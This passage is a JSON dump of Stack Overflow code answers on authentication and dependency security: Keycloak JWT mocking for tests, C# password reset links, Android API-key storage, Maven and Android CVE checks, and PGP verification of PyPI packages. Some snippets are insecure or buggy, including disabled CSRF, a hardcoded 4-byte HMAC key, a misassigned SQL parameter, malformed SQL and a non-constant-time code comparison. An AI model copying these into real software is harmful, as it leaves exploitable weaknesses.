JoseException {\n        // Create the Claims, which will be the content of the JWT\n        JwtClaims claims = new JwtClaims();\n        claims.setJwtId(UUID.randomUUID().toString()); // a unique identifier for the token\n        claims.setExpirationTimeMinutesInTheFuture(10); // time when the token will expire (10 minutes from now)\n        claims.setNotBeforeMinutesInThePast(0); // time before which the token is not yet valid (2 minutes ago)\n        claims.setIssuedAtToNow(); // when the token was issued/created (now)\n        claims.setAudience(\"account\"); // to whom this token is intended to be sent\n        claims.setIssuer(String.format(\"%s/auth/realms/%s\",keycloakBaseUrl,keycloakRealm)); // who creates the token and signs it\n        claims.setSubject(UUID.randomUUID().toString()); // the subject/principal is whom the token is about\n        claims.setClaim(\"typ\",\"Bearer\"); // set type of token\n        claims.setClaim(\"azp\",\"example-client-id\"); // Authorized party  (the party to which this token was issued)\n        claims.setClaim(\"auth_time\", NumericDate.fromMilliseconds(Instant.now().minus(11, ChronoUnit.SECONDS).toEpochMilli()).getValue()); // time when authentication occured\n        claims.setClaim(\"session_state\", UUID.randomUUID().toString()); // keycloak specific ???\n        claims.setClaim(\"acr\", \"0\"); //Authentication context class\n        claims.setClaim(\"realm_access\", Map.of(\"roles\",List.of(\"offline_access\",\"uma_authorization\",\"user\"))); //keycloak roles\n        claims.setClaim(\"resource_access\", Map.of(\"account\",\n                    Map.of(\"roles\", List.of(\"manage-account\",\"manage-account-links\",\"view-profile\"))\n                )\n        ); //keycloak roles\n        claims.setClaim(\"scope\",\"profile email\");\n        claims.setClaim(\"name\", \"John Doe\"); // additional claims/attributes about the subject can be added\n        claims.setClaim(\"email_verified\",true);\n        claims.setClaim(\"preferred_username\", \"doe.john\");\n        claims.setClaim(\"given_name\", \"John\");\n        claims.setClaim(\"family_name\", \"Doe\");\n        // A JWT is a JWS and/or a JWE with JSON claims as the payload.\n        // In this example it is a JWS so we create a JsonWebSignature object.\n        JsonWebSignature jws = new JsonWebSignature();\n        // The payload of the JWS is JSON content of the JWT Claims\n        jws.setPayload(claims.toJson());\n        // The JWT is signed using the private key\n        jws.setKey(rsaJsonWebKey.getPrivateKey());\n        // Set the Key ID (kid) header because it's just the polite thing to do.\n        // We only have one key in this example but a using a Key ID helps\n        // facilitate a smooth key rollover process\n        jws.setKeyIdHeaderValue(rsaJsonWebKey.getKeyId());\n        // Set the signature algorithm on the JWT/JWS that will integrity protect the claims\n        jws.setAlgorithmHeaderValue(AlgorithmIdentifiers.RSA_USING_SHA256);\n        // set the type header\n        jws.setHeader(\"typ\",\"JWT\");\n        // Sign the JWS and produce the compact serialization or the complete JWT/JWS\n        // representation, which is a string consisting of three dot ('.') separated\n        // base64url-encoded parts in the form Header.Payload.Signature\n        return jws.getCompactSerialization();\n    }\n    @RestController\n    public static class TestController {\n        @GetMapping(\"/test\")\n        public String test() {\n            return \"hello\";\n        }\n    }\n}",
        "score": 15,
        "is_accepted": false,
        "creation_date": "2020-02-25T09:29:17",
        "author": "Tamim"
      },
      {
        "answer_id": 60396907,
        "body": "String openidConfig = \"{\\n\" +\n                    \"  \\\"issuer\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"\\\",\\n\" +\n                    \"  \\\"authorization_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/auth\\\",\\n\" +\n                    \"  \\\"token_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token\\\",\\n\" +\n                    \"  \\\"token_introspection_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token/introspect\\\",\\n\" +\n                    \"  \\\"userinfo_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/userinfo\\\",\\n\" +\n                    \"  \\\"end_session_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/logout\\\",\\n\" +\n                    \"  \\\"jwks_uri\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/certs\\\",\\n\" +\n                    \"  \\\"check_session_iframe\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/login-status-iframe.html\\\",\\n\" +\n                    \"  \\\"registration_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/clients-registrations/openid-connect\\\",\\n\" +\n                    \"  \\\"introspection_endpoint\\\": \\\"\" + keycloakBaseUrl + \"/auth/realms/\" + keycloakRealm + \"/protocol/openid-connect/token/introspect\\\"\\n\" +\n                    \"}\";\nstubFor(WireMock.get(urlEqualTo(String.format(\"/auth/realms/%s/.well-known/openid-configuration\", keycloakRealm)))\n                    .willReturn(aResponse()\n                            .withHeader(\"Content-Type\", \"application/json\")\n                            .withBody(openidConfig)\n                    )\n            );",
        "score": 15,
        "is_accepted": false,
        "creation_date": "2020-02-25T09:29:17",
        "author": "Tamim"
      },
      {
        "answer_id": 60396907,
        "body": "@Configuration\n@EnableWebSecurity\n@ComponentScan(basePackageClasses = KeycloakSecurityComponents.class)\npublic class SecurityConfig extends KeycloakWebSecurityConfigurerAdapter {\n    @Autowired\n    public void configureGlobal(AuthenticationManagerBuilder auth) {\n        SimpleAuthorityMapper grantedAuthorityMapper = new SimpleAuthorityMapper();\n        grantedAuthorityMapper.setPrefix(\"ROLE_\");\n        KeycloakAuthenticationProvider keycloakAuthenticationProvider = keycloakAuthenticationProvider();\n        keycloakAuthenticationProvider.setGrantedAuthoritiesMapper(grantedAuthorityMapper);\n        auth.authenticationProvider(keycloakAuthenticationProvider);\n    }\n    /*\n     * Workaround for reading the properties for the keycloak adapter (see https://stackoverflow.com/questions/57787768/issues-running-example-keycloak-spring-boot-app)\n     */\n    @Bean\n    @Primary\n    public KeycloakConfigResolver keycloakConfigResolver(KeycloakSpringBootProperties properties) {\n        return new CustomKeycloakSpringBootConfigResolver(properties);\n    }\n    @Bean\n    @Override\n    protected SessionAuthenticationStrategy sessionAuthenticationStrategy() {\n        return new RegisterSessionAuthenticationStrategy(new SessionRegistryImpl());\n    }\n    @Bean\n    @Override\n    @ConditionalOnMissingBean(HttpSessionManager.class)\n    protected HttpSessionManager httpSessionManager() {\n        return new HttpSessionManager();\n    }\n    @Override\n    protected void configure(HttpSecurity http) throws Exception {\n        super.configure(http);\n        http\n                .authorizeRequests()\n                .antMatchers(\"/**\").hasRole(\"user\")\n                .anyRequest().authenticated()\n                .and().csrf().disable();\n    }\n}",
        "score": 15,
        "is_accepted": false,
        "creation_date": "2020-02-25T09:29:17",
        "author": "Tamim"
      },
      {
        "answer_id": 60396907,
        "body": " /*\n  * Workaround for reading the properties for the keycloak adapter (see https://stackoverflow.com/questions/57787768/issues-running-example-keycloak-spring-boot-app)\n  */\n@Configuration\npublic class CustomKeycloakSpringBootConfigResolver extends KeycloakSpringBootConfigResolver {\n    private final KeycloakDeployment keycloakDeployment;\n    public CustomKeycloakSpringBootConfigResolver(KeycloakSpringBootProperties properties) {\n        keycloakDeployment = KeycloakDeploymentBuilder.build(properties);\n    }\n    @Override\n    public KeycloakDeployment resolve(HttpFacade.Request facade) {\n        return keycloakDeployment;\n    }\n}",
        "score": 15,
        "is_accepted": false,
        "creation_date": "2020-02-25T09:29:17",
        "author": "Tamim"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/12574595/how-to-create-a-password-reset-link",
    "title": "How to create a password reset link?",
    "question_id": 12574595,
    "posted_date": "2012-09-24T20:05:02",
    "answers": [
      {
        "answer_id": 12574622,
        "body": "[HttpGet]\n    [HttpHead]\n    public IActionResult GetPasswordResetForm()\n    {\n        // Return a <form> allowing the user to confirm they want to reset their password, which POSTs to the action below.\n    }\n    static readonly TimeSpan _passwordResetExpiry = TimeSpan.FromMinutes( 5 );\n    [HttpPost]\n    public IActionResult SendPasswordResetCode()\n    {\n        // 1. Get a cryptographically secure random number:\n        // using System.Security.Cryptography;\n        Byte[] bytes;\n        String bytesBase64Url; // NOTE: This is Base64Url-encoded, not Base64-encoded, so it is safe to use this in a URL, but be sure to convert it to Base64 first when decoding it.\n        using( RandomNumberGenerator rng = new RandomNumberGenerator() ) {\n\n            bytes = new Byte[12]; // Use a multiple of 3 (e.g. 3, 6, 12) to prevent output with trailing padding '=' characters in Base64).\n            rng.GetBytes( bytes );\n\n            // The `.Replace()` methods convert the Base64 string returned from `ToBase64String` to Base64Url.\n            bytesBase64Url = Convert.ToBase64String( bytes ).Replace( '+', '-' ).Replace( '/', '_' );\n        }\n        // 2. Update the user's database row:\n        using( SqlConnection c = new SqlConnection( CONNECTION_STRING ) )\n        using( SqlCommand cmd = c.CreateCommand() )\n        {\n            cmd.CommandText = \"UPDATE dbo.Users SET PasswordResetCode = @code, PasswordResetStart = SYSUTCDATETIME() WHERE UserId = @userId\";\n\n            SqlParameter pCode = cmd.Parameters.Add( cmd.CreateParameter() );\n            pCode.ParameterName = \"@code\";\n            pCode.SqlDbType     = SqlDbType.Binary;\n            pCode.Value         = bytes;\n            SqlParameter pUserId = cmd.Parameters.Add( cmd.CreateParameter() );\n            pCode.ParameterName = \"@userId\";\n            pCode.SqlDbType     = SqlDbType.Int;\n            pCode.Value         = userId;\n            cmd.ExecuteNonQuery();\n        }\n        // 3. Send the email:\n        {\n            const String fmt = @\"Greetings {0},\n    I am Ziltoid... the omniscient.\n    I have come from far across the omniverse.\n    You shall fetch me your universe's ultimate cup of coffee... uh... I mean, you can reset your password at {1}\n    You have {2:N0} Earth minutes,\n    Make it perfect!\";\n            // e.g. \"https://example.com/ResetPassword/123/ABCDEF\"\n            String link = \"https://example.com/\" + this.Url.Action(\n                controller: nameof(PasswordResetController),\n                action: nameof(this.ResetPassword),\n                params: new { userId = userId, codeBase64 = bytesBase64Url }\n            );\n            String body = String.Format( CultureInfo.InvariantCulture, fmt, userName, link, _passwordResetExpiry.TotalMinutes );\n            this.emailService.SendEmail( user.Email, subject: \"Password reset link\", body );\n        }\n    }\n    [HttpGet( \"/PasswordReset/ResetPassword/{userId}/{codeBase64Url}\" )]\n    public IActionResult ResetPassword( Int32 userId, String codeBase64Url )\n    {\n        // Lookup the user and see if they have a password reset pending that also matches the code:\n\n        String codeBase64 = codeBase64Url.Replace( '-', '+' ).Replace( '_', '/' );\n        Byte[] providedCode = Convert.FromBase64String( codeBase64 );\n        if( providedCode.Length != 12 ) return this.BadRequest( \"Invalid code.\" );\n\n        using( SqlConnection c = new SqlConnection( CONNECTION_STRING ) )\n        using( SqlCommand cmd = c.CreateCommand() )\n        {\n            cmd.CommandText = \"SELECT UserId, PasswordResetCode, PasswordResetStart FROM dbo.Users SET WHERE UserId = @userId\";\n\n            SqlParameter pUserId = cmd.Parameters.Add( cmd.CreateParameter() );\n            pCode.ParameterName = \"@userId\";\n            pCode.SqlDbType     = SqlDbType.Int;\n            pCode.Value         = userId;\n            using( SqlDataReader rdr = cmd.ExecuteReader() )\n            {\n                if( !rdr.Read() )\n                {\n                    // UserId doesn't exist in the database.\n                    return this.NotFound( \"The UserId is invalid.\" );\n                }\n                if( rdr.IsDBNull( 1 ) || rdr.IsDBNull( 2 ) )\n                {\n                    return this.Conflict( \"There is no pending password reset.\" );\n                }\n                Byte[]    expectedCode = rdr.GetBytes( 1 );\n                DateTime? start        = rdr.GetDateTime( 2 );\n                if( !Enumerable.SequenceEqual( providedCode, expectedCode ) )\n                {\n                    return this.BadRequest( \"Incorrect code.\" );\n                }\n\n                // Now return a new form (with the same password reset code) which allows the user to POST their new desired password to the `SetNewPassword` action` below.\n            }\n        }\n        [HttpPost( \"/PasswordReset/ResetPassword/{userId}/{codeBase64}\" )]\n        public IActionResult SetNewPassword( Int32 userId, String codeBase64, [FromForm] String newPassword, [FromForm] String confirmNewPassword )\n        {\n            // 1. Use the same code as above to verify `userId` and `codeBase64`, and that `PasswordResetStart` was less than 5 minutes (or `_passwordResetExpiry`) ago.\n            // 2. Validate that `newPassword` and `confirmNewPassword` are the same.\n            // 3. Reset `dbo.Users.Password` by hashing `newPassword`, and clear `PasswordResetCode` and `PasswordResetStart`\n            // 4. Send the user a confirmatory e-mail informing them that their password was reset, consider including the current request's IP address and user-agent info in that e-mail message as well.\n            // 5. And then perform a HTTP 303 redirect to the login page - or issue a new session token cookie and redirect them to the home-page.\n        }\n    }",
        "score": 27,
        "is_accepted": false,
        "creation_date": "2012-09-24T20:08:32",
        "author": "Dai"
      },
      {
        "answer_id": 12574622,
        "body": "private static readonly Byte[] _privateKey = new Byte[] { 0xDE, 0xAD, 0xBE, 0xEF }; // NOTE: You should use a private-key that's a LOT longer than just 4 bytes.\nprivate static readonly TimeSpan _passwordResetExpiry = TimeSpan.FromMinutes( 5 );\nprivate const Byte _version = 1; // Increment this whenever the structure of the message changes.\npublic static String CreatePasswordResetHmacCode( Int32 userId )\n{\n    Byte[] message = Enumerable.Empty<Byte>()\n        .Append( _version )\n        .Concat( BitConverter.GetBytes( userId ) )\n        .Concat( BitConverter.GetBytes( DateTime.UtcNow.ToBinary() ) )\n        .ToArray();\n    using( HMACSHA256 hmacSha256 = new HMACSHA256( key: _privateKey ) )\n    {\n        Byte[] hash = hmacSha256.ComputeHash( buffer: message, offset: 0, count: message.Length );\n        Byte[] outputMessage = message.Concat( hash ).ToArray();\n        String outputCodeB64 = Convert.ToBase64( outputMessage );\n        String outputCode    = outputCodeB64.Replace( '+', '-' ).Replace( '/', '_' );\n        return outputCode;\n\t}\n}\npublic static Boolean VerifyPasswordResetHmacCode( String codeBase64Url, out Int32 userId )\n{\n    String base64 = codeBase64Url.Replace( '-', '+' ).Replace( '_', '/' );\n    Byte[] message = Convert.FromBase64String( base64 );\n\n    Byte version = message[0];\n    if( version < _version ) return false;\n\n    userId = BitConverter.ToInt32( message, startIndex: 1 ); // Reads bytes message[1,2,3,4]\n    Int64 createdUtcBinary = BitConverter.ToInt64( message, startIndex: 1 + sizeof(Int32) ); // Reads bytes message[5,6,7,8,9,10,11,12]\n\n    DateTime createdUtc = DateTime.FromBinary( createdUtcBinary );\n    if( createdUtc.Add( _passwordResetExpiry ) < DateTime.UtcNow ) return false;\n\n    const Int32 _messageLength = 1 + sizeof(Int32) + sizeof(Int64); // 1 + 4 + 8 == 13\n    using( HMACSHA256 hmacSha256 = new HMACSHA256( key: _privateKey ) )\n    {\n        Byte[] hash = hmacSha256.ComputeHash( message, offset: 0, count: _messageLength );\n\n        Byte[] messageHash = message.Skip( _messageLength ).ToArray();\n        return Enumerable.SequenceEquals( hash, messageHash );\n    }\n}",
        "score": 27,
        "is_accepted": false,
        "creation_date": "2012-09-24T20:08:32",
        "author": "Dai"
      },
      {
        "answer_id": 12574622,
        "body": "// Note there is no `UserId` URL parameter anymore because it's embedded in `code`:\n[HttpGet( \"/PasswordReset/ResetPassword/{codeBase64Url}\" )]\npublic IActionResult ConfirmResetPassword( String codeBase64Url )\n{\n    if( !VerifyPasswordResetHmacCode( codeBase64Url, out Int32 userId ) )\n    {\n        // Message is invalid, such as the HMAC hash being incorrect, or the code has expired.\n        return this.BadRequest( \"Invalid, tampered, or expired code used.\" );\n    }\n    else\n    {\n        // Return a web-page with a <form> to POST the code.\n        // Render the `codeBase64Url` to an <input type=\"hidden\" /> to avoid the user inadvertently altering it.\n        // Do not reset the user's password in a GET request because GET requests must be \"safe\". If you send a password-reset link by SMS text message or even by email, then software bot (like link-preview generators) may follow the link and inadvertently reset the user's password!\n    }\n}\n[HttpPost( \"/PasswordReset/ResetPassword\" )]\npublic IActionResult ConfirmResetPassword( [FromForm] ConfirmResetPasswordForm model )\n{\n    if( !VerifyPasswordResetHmacCode( model.CodeBase64Url, out Int32 userId ) )\n    {\n        return this.BadRequest( \"Invalid, tampered, or expired code used.\" );\n    }\n    else\n    {\n        // Reset the user's password here.\n    }\n}",
        "score": 27,
        "is_accepted": false,
        "creation_date": "2012-09-24T20:08:32",
        "author": "Dai"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58297625/how-to-make-my-code-secure-and-prevent-from-decompiling",
    "title": "How to make my code secure and prevent from decompiling?",
    "question_id": 58297625,
    "posted_date": "2019-10-09T01:31:24",
    "answers": [
      {
        "answer_id": 60450860,
        "body": "#include <jni.h>\n#include <string>\n#include \"api_key.h\"\nextern \"C\" JNIEXPORT jstring JNICALL\nJava_com_criticalblue_currencyconverterdemo_MainActivity_stringFromJNI(\n        JNIEnv *env,\n        jobject /* this */) {\n    // To add the API_KEY to the mobile app when is compiled you need to:\n    //   * copy `api_key.h.example` to `api_key.h`\n    //   * edit the file and replace this text `place-the-api-key-here` with your desired API_KEY\n    std::string JNI_API_KEY = API_KEY_H;\n    return env->NewStringUTF(JNI_API_KEY.c_str());\n}",
        "score": 13,
        "is_accepted": true,
        "creation_date": "2020-02-28T06:32:36",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/49548622/vuex-empty-state-on-logout",
    "title": "vuex empty state on logout",
    "question_id": 49548622,
    "posted_date": "2018-03-29T01:24:13",
    "answers": [
      {
        "answer_id": 56315906,
        "body": "// store.js\n\n// Initial store with modules as an object\nexport const initialStoreModules = {\n    user,\n    recruitment,\n};\n\nexport default new Vuex.Store({\n    /**\n     * Assign the modules to the store\n     * using lodash deepClone to avoid changing the initial store module values\n     */\n    modules: _.cloneDeep(initialStoreModules),\n    mutations: {\n        // reset default state modules by looping around the initialStoreModules\n        resetState(state) {\n        _.forOwn(initialStoreModules, (value, key) => {\n            state[key] = _.cloneDeep(value.state);\n        });\n        },\n    }\n});",
        "score": 9,
        "is_accepted": true,
        "creation_date": "2019-05-26T13:35:26",
        "author": "Mukundhan"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54653400/android-cve-check",
    "title": "Android CVE Check",
    "question_id": 54653400,
    "posted_date": "2019-02-12T10:22:48",
    "answers": [
      {
        "answer_id": 57035277,
        "body": "...\nlintClassPath - The lint embedded classpath\n\\--- com.android.tools.lint:lint-gradle:26.4.1\n     +--- com.android.tools:sdk-common:26.4.1\n     |    +--- com.android.tools:sdklib:26.4.1\n     |    |    +--- com.android.tools.layoutlib:layoutlib-api:26.4.1\n     |    |    ...\n     |    +--- com.android.tools.ddms:ddmlib:26.4.1 (*)\n     |    +--- org.bouncycastle:bcpkix-jdk15on:1.56\n     |    |    \\--- org.bouncycastle:bcprov-jdk15on:1.56   <--\n     |    +--- org.bouncycastle:bcprov-jdk15on:1.56   <--\n...",
        "score": 10,
        "is_accepted": false,
        "creation_date": "2019-07-15T03:42:22",
        "author": "CaHa"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/48779631/net-core-2-0-user-secrets-and-unit-testing",
    "title": ".NET Core 2.0 User Secrets and Unit Testing",
    "question_id": 48779631,
    "posted_date": "2018-02-13T23:22:16",
    "answers": [
      {
        "answer_id": 73871960,
        "body": "c#\nusing NUnit.Framework;\nusing MediatR;\nusing Microsoft.AspNetCore.Hosting;\nusing Microsoft.Extensions.Configuration;\nusing Microsoft.Extensions.DependencyInjection;\nusing Microsoft.Extensions.Hosting;\nnamespace Example\n{\n    public class ConfigurationExampleTest\n    {\n        public IMediator? _mediator { get; set; }\n        public IConfiguration config { get; set; }\n        [SetUp]\n        public void Setup()\n        {\n            // The startupPath is simply one way of getting the path to\n            // appettings.json. We could hard code tha path if necessary\n            // or use any other method to obtain the path to appsettings.json\n            var filepath = typeof(WebApp.Startup)\n                .Assembly.Location;\n            var StartupPath = Path.GetDirectoryName(filepath);\n            config = new ConfigurationBuilder()\n                .SetBasePath(StartupPath)\n                .AddJsonFile(\"appsettings.json\", optional: true)\n                .AddUserSecrets<ConfigurationExampleTest>()\n                .AddEnvironmentVariables()\n                .Build();\n\n            var host = Host.CreateDefaultBuilder()\n                .ConfigureWebHostDefaults(builder =>\n                {\n                    builder.UseStartup<WebApp.Startup>();\n                })\n                .ConfigureServices(services =>\n                {\n                    // Adds the config to the dependency injection\n                    // This makes the config object accessible in\n                    // your WebApp/project-under-test\n                    services.AddSingleton(config);\n                })\n                .Build();\n\n             // This will get any service we added to the dependency injection\n             // in WebApp.Startup\n            _mediator = host.Services.GetService<IMediator>();\n        }\n        [TearDown]\n        public void Teardown()\n        { }\n        [Test]\n        public void ExampleTest()\n        {\n            // The configuration object will now be available\n            // vai dependency ibjection\n            // We can use the_mediator instance we got from the\n            // dependency injection here\n\n            // _mediator.Send(<your request>);\n\n        }\n    }\n}",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2022-09-27T14:00:51",
        "author": "kkuilla"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76971922/addressing-critical-vulnerabilities-in-maven-dependencies",
    "title": "Addressing critical vulnerabilities in Maven dependencies",
    "question_id": 76971922,
    "posted_date": "2023-08-24T14:06:49",
    "answers": [
      {
        "answer_id": 76976581,
        "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\t<name>Test App</name>\n\t<groupId>test</groupId>\n\t<artifactId>testApp</artifactId>\n\t<version>1.0.0-SNAPSHOT</version>\n\t<packaging>jar</packaging>\n\t<parent>\n\t\t<groupId>org.springframework.boot</groupId>\n\t\t<artifactId>spring-boot-starter-parent</artifactId>\n\t\t<version>3.1.2</version>\n\t\t<relativePath />\n\t</parent>\n\t<dependencies>\n\t\t<dependency>\n\t\t\t<groupId>com.datastax.cassandra</groupId>\n\t\t\t<artifactId>cassandra-driver-extras</artifactId>\n\t\t\t<version>3.11.4</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>com.fasterxml.jackson.core</groupId>\n\t\t\t<artifactId>jackson-databind</artifactId>\n\t\t\t<version>2.15.2</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>org.json</groupId>\n\t\t\t<artifactId>json</artifactId>\n\t\t\t<version>20230618</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>org.apache.spark</groupId>\n\t\t\t<artifactId>spark-core_2.13</artifactId>\n\t\t\t<version>3.4.1</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>org.apache.kerby</groupId>\n\t\t\t<artifactId>kerb-server</artifactId>\n\t\t\t<version>1.0.1</version>\n\t\t</dependency>\n\t</dependencies>\n\t<build>\n\t\t<plugins>\n\t\t\t<plugin>\n\t\t\t\t<groupId>org.owasp</groupId>\n\t\t\t\t<artifactId>dependency-check-maven</artifactId>\n\t\t\t\t<version>8.4.0</version>\n\t\t\t\t<executions>\n\t\t\t\t\t<execution>\n\t\t\t\t\t\t<goals>\n\t\t\t\t\t\t\t<goal>check</goal>\n\t\t\t\t\t\t</goals>\n\t\t\t\t\t</execution>\n\t\t\t\t</executions>\n\t\t\t</plugin>\n\t\t</plugins>\n\t</build>\n</project>",
        "score": 7,
        "is_accepted": true,
        "creation_date": "2023-08-25T07:01:44",
        "author": "Pino"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/46986355/java-programmatically-access-ssl-certificates-under-system-roots-on-mac-os-x",
    "title": "(Java) Programmatically access SSL certificates under &quot;System Roots&quot; on Mac OS X",
    "question_id": 46986355,
    "posted_date": "2017-10-28T00:48:36",
    "answers": [
      {
        "answer_id": 63274324,
        "body": "public static void main(String... args) {\n  // Keychains that we can use\n  final String KEYCHAIN_PATH = \"/Library/Keychains/System.keychain\";\n  final String SYSTEM_KEYCHAIN_PATH = \"/System/Library/Keychains/SystemRootCertificates.keychain\";\n  // Show me only certificates from VeriSign\n  final String AUTHORITY = \"VeriSign\";\n  final String OSX_SEC_COMMAND = \"security find-certificate -a -p -c %AUTHORITY% %KEYCHAIN%\";\n  final String cmd = OSX_SEC_COMMAND.replace(\"%AUTHORITY%\", AUTHORITY).replace(\"%KEYCHAIN%\", SYSTEM_KEYCHAIN_PATH);\n  System.out.println(cmd);\n  System.out.println();\n  final AppleScript script = new AppleScript(cmd);\n  InputStream certificateStream = null;\n  try {\n    // Run script\n    final String result = script.run();\n    certificateStream = new ByteArrayInputStream(result.getBytes());\n    // Process the output of the command\n    final CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\");\n    final Collection<X509Certificate> certificates = (Collection<X509Certificate>) certificateFactory.generateCertificates(certificateStream);\n    // Use the certificates as you need\n    for (X509Certificate certificate : certificates) {\n      String alias = certificate.getSubjectX500Principal().getName();\n      System.out.println(\"Certificate: \" + alias);\n    }\n  } catch (Throwable t) {\n    t.printStackTrace();\n  } finally {\n    if (certificateStream != null) {\n      try {\n        certificateStream.close();\n      } catch (IOException io) {\n        io.printStackTrace();\n      }\n    }\n  }\n}",
        "score": 6,
        "is_accepted": false,
        "creation_date": "2020-08-05T18:21:10",
        "author": "jccampanero"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/46270513/verifying-the-integrity-of-pypi-python-packages",
    "title": "Verifying the integrity of PyPI Python packages",
    "question_id": 46270513,
    "posted_date": "2017-09-17T21:47:11",
    "answers": [
      {
        "answer_id": 63568630,
        "body": "user@disp5066:~$ wget https://files.pythonhosted.org/packages/97/68/27d96a12f54894223ad6676ce4d215ad61771e3e723580f3ee6e609e17b7/borgbackup-1.1.13.tar.gz.asc\n--2020-07-02 07:51:12--  https://files.pythonhosted.org/packages/97/68/27d96a12f54894223ad6676ce4d215ad61771e3e723580f3ee6e609e17b7/borgbackup-1.1.13.tar.gz.asc\nResolving files.pythonhosted.org (files.pythonhosted.org)... 151.101.37.63, 2a04:4e42:9::319\nConnecting to files.pythonhosted.org (files.pythonhosted.org)|151.101.37.63|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 862 [application/octet-stream]\nSaving to: \u2018borgbackup-1.1.13.tar.gz.asc\u2019\nborgbackup-1.1.13.t 100%[===================>]     862  --.-KB/s    in 0s\n2020-07-02 07:51:14 (37.2 MB/s) - \u2018borgbackup-1.1.13.tar.gz.asc\u2019 saved [862/862]\nuser@disp5066:~$ cat borgbackup-1.1.13.tar.gz.asc\n-----BEGIN PGP SIGNATURE-----\niQJHBAABCgAxFiEEL4Gv+6sE4R/o7mXUJDrPqVH3jgEFAl7cGqwTHHR3QHdhbGRt\nYW5uLWVkdi5kZQAKCRAkOs+pUfeOAd9ND/4nm2O7CK5a4aK41jAI1NisbgEtEJup\nSiD6bvMKpo3VU0P/3Y6pUibKOGzaRImBTB04qS3LlgjB0mCp1RSVsj/Hn+yCNw+k\nhfUH7E7JgAkq96Vkv1dcYgaJ9nhzuIAkEf0aDyzSo8HkBvGGN0/tfCQ7Nr7hI21u\nv5qupIyu7KZrBwY389l7+6yJ9G5qCtHU0fDALRYyjsX+WphrAaizrhFZJO7Km8VZ\ngZhAz3WUDPFwgNMb1mToUxpI2ZpnYnRxVBwjnX0Ps77ua4F5OsYM+hYwH5eX9bS9\ngmb+W3NjUNjVVj4z+OgN8FGbCTeFVQ6E+IVdm55D4ZRU8KarvFoKOI7HS4GP/3iv\n4iWqDaYBMRShnUTk1FKFCKjTb5tXewUGPwio+4bpgUyfJj0OWj1ecMqeF5VAslWz\n6pZnsUqLpTFuHUA6dr18TKX4U+c6rdXVM7BhNZe2XtjaQwau6Wz9nC1xhZyFNl1q\nCHY7jmLhsfP8GXkh31X9bJrKSZMyYRYat2e7kOroIJczRcHG9T708T+KzsfAb+6w\npWZbfWNfCbCmVQehyhDvNepB3IB5w6ijrZwKTamHAnYBVkAUD/aYwDQJf4nAL4YI\n7JXBRpLlCVQGRUQdClqy8QjzpSZs5/Dbetvy5of753JbVjFQtGO2gLLp0wL0HB0v\nvIZv3dfBDvfcXQ==\n=F4gj\n-----END PGP SIGNATURE-----\nuser@disp5066:~$",
        "score": 5,
        "is_accepted": false,
        "creation_date": "2020-08-24T16:57:02",
        "author": "Michael Altfield"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/42053203/how-to-log-out-of-an-expired-session-in-laravel-5-x",
    "title": "How to log out of an expired session in Laravel 5.x?",
    "question_id": 42053203,
    "posted_date": "2017-02-05T09:28:00",
    "answers": [
      {
        "answer_id": 42096968,
        "body": "/**\n * The priority-sorted list of middleware.\n *\n * This forces non-global middleware to always be in the given order.\n *\n * @var array\n */\nprotected $middlewarePriority = [\n    \\Illuminate\\Session\\Middleware\\StartSession::class,\n    \\Illuminate\\View\\Middleware\\ShareErrorsFromSession::class,\n    \\Illuminate\\Auth\\Middleware\\Authenticate::class,\n    \\Illuminate\\Session\\Middleware\\AuthenticateSession::class,\n    \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class,\n    \\Illuminate\\Auth\\Middleware\\Authorize::class,\n];",
        "score": 5,
        "is_accepted": true,
        "creation_date": "2017-02-07T13:11:37",
        "author": "Moshe Katz"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69582105/what-is-the-right-way-to-upgrade-netty-and-its-components-for-security-reason",
    "title": "What is the right way to upgrade netty and its components for security reason?",
    "question_id": 69582105,
    "posted_date": "2021-10-15T04:46:53",
    "answers": [
      {
        "answer_id": 69582710,
